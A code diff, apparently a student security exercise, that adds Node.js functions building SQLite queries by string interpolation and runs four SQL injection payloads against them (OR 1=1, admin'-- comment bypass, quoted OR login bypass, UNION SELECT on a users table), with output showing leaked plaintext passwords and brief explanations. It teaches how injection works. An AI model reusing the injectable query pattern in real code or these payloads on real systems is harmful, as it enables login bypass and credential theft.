@@ -79,5 +79,182 @@ db.run("UPDATE products SET price = 38000 WHERE id = 1", function (err) {
   });
 });
 
+no3
+const Database = require('better-sqlite3');
+const db = new Database('nyondo_stock.db');
 
+function searchProduct(name) {
+const query = `SELECT * FROM products WHERE name LIKE '%${name}%'`;
+console.log('Query:', query);
+const rows = db.prepare(query).all();
+
+console.log('Result:', rows, '\n');
+return rows;
+}
+
+function login(username, password) {
+const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;
+console.log('Query:', query);
+const row = db.prepare(query).get();
+console.log('Result:', row, '\n');
+return row;
+}
+
+
+searchProduct("' OR 1=1--")
+login("admin'--", "anything")
+login("' OR '1'='1", "' OR '1'='1")
+searchProduct("' UNION SELECT id, username, password, role FROM users--")
+
+attack 1
+
+'It works because 1=1 is always true and comments out the rest of the query'
+
+Query: SELECT * FROM products WHERE name LIKE '%' OR 1=1--%'
+Result: [
+  {
+    id: 1,
+    name: 'Cement (bag)',
+    description: 'Portland cement 50kg bag',
+    price: 38000
+  },
+  {
+    id: 2,
+    name: 'Iron Sheet 3m',
+    description: 'Gauge 30 roofing sheet 3m long',
+    price: 110000
+  },
+  {
+    id: 3,
+    name: 'Paint 5L',
+    description: 'Exterior wall paint white 5L',
+    price: 60000
+  },
+  {
+    id: 4,
+    name: 'Nails 1kg',
+    description: 'Common wire nails 1kg pack',
+    price: 12000
+  },
+  {
+    id: 5,
+    name: 'Timber 2x4',
+    description: 'Pine timber plank 2x4 per metre',
+    price: 25000
+  },
+  {
+    id: 6,
+    name: 'Cement (bag)',
+    description: 'Portland cement 50kg bag',
+    price: 35000
+  },
+  {
+    id: 7,
+    name: 'Iron Sheet 3m',
+    description: 'Gauge 30 roofing sheet 3m long',
+    price: 110000
+  },
+  {
+    id: 8,
+    name: 'Paint 5L',
+    description: 'Exterior wall paint white 5L',
+    price: 60000
+  },
+  {
+    id: 9,
+    name: 'Nails 1kg',
+    description: 'Common wire nails 1kg pack',
+    price: 12000
+  },
+  {
+    id: 10,
+    name: 'Timber 2x4',
+    description: 'Pine timber plank 2x4 per metre',
+    price: 25000
+  }
+]
+
+attack 2
+
+'it works because it comments out the password check, so you login as an admin without a password'
+
+Query: SELECT * FROM users WHERE username='admin'--' AND password='anything'
+Result: { id: 1, username: 'admin', password: 'admin123', role: 'admin' }
+
+attack 3
+
+""1"="1" is always true  so the login is bypassed"
+
+Query: SELECT * FROM users WHERE username='' OR '1'='1' AND password='' OR '1'='1'
+Result: { id: 1, username: 'admin', password: 'admin123', role: 'admin' }
+
+attack 4
+
+'union combines results from another table so the usernames mix with passwords ,the Databasecant tell what is data vs code  and attackers can inject SQL commands'
+Query: SELECT * FROM products WHERE name LIKE '%' UNION SELECT id, username, password, role FROM users--%'
+Result: [
+  {
+    id: 1,
+    name: 'Cement (bag)',
+    description: 'Portland cement 50kg bag',
+    price: 38000
+  },
+  { id: 1, name: 'admin', description: 'admin123', price: 'admin' },
+  {
+    id: 2,
+    name: 'Iron Sheet 3m',
+    description: 'Gauge 30 roofing sheet 3m long',
+    price: 110000
+  },
+  { id: 2, name: 'fatuma', description: 'pass456', price: 'attendant' },
+  {
+    id: 3,
+    name: 'Paint 5L',
+    description: 'Exterior wall paint white 5L',
+    price: 60000
+  },
+  { id: 3, name: 'wasswa', description: 'pass789', price: 'manager' },
+  {
+    id: 4,
+    name: 'Nails 1kg',
+    description: 'Common wire nails 1kg pack',
+    price: 12000
+  },
+  {
+    id: 5,
+    name: 'Timber 2x4',
+    description: 'Pine timber plank 2x4 per metre',
+    price: 25000
+  },
+  {
+    id: 6,
+    name: 'Cement (bag)',
+    description: 'Portland cement 50kg bag',
+    price: 35000
+  },
+  {
+    id: 7,
+    name: 'Iron Sheet 3m',
+    description: 'Gauge 30 roofing sheet 3m long',
+    price: 110000
+  },
+  {
+    id: 8,
+    name: 'Paint 5L',
+    description: 'Exterior wall paint white 5L',
+    price: 60000
+  },
+  {
+    id: 9,
+    name: 'Nails 1kg',
+    description: 'Common wire nails 1kg pack',
+    price: 12000
+  },
+  {
+    id: 10,
+    name: 'Timber 2x4',
+    description: 'Pine timber plank 2x4 per metre',
+    price: 25000
+  }
+]
 
